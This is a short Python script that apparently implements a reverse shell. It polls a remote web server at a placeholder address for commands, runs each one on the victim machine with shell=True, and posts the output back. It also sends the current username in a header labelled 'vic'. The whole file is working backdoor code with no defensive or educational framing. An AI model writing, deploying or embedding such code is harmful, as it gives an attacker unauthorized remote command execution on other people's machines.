#!/usr/bin/python3
import requests
from subprocess import Popen,PIPE,getoutput
from time import sleep
from os import chdir

def execute(command):
    if command.lower() == "exit":
        exit()
    elif "cd " in command.lower() and len(command.split()) == 2:
        try:
            chdir(command.split()[1])
            return
        except Exception:
            return
    else:
        with Popen(command,shell=True,stdout=PIPE,stderr=PIPE) as shell:
            output = shell.communicate()[0] if shell.communicate()[0] else shell.communicate()[1]
            return output.decode()

def rshell(url):
    try:
        while True:
            header = {"vic":f"{getoutput('whoami')}"}
            command = requests.get(url,headers=header).text
            post = requests.post(url,data=execute(command))
    except Exception as e:
        exit()
    except KeyboardInterrupt as ki:
        exit()
rshell("http://serverhost:serverport/")
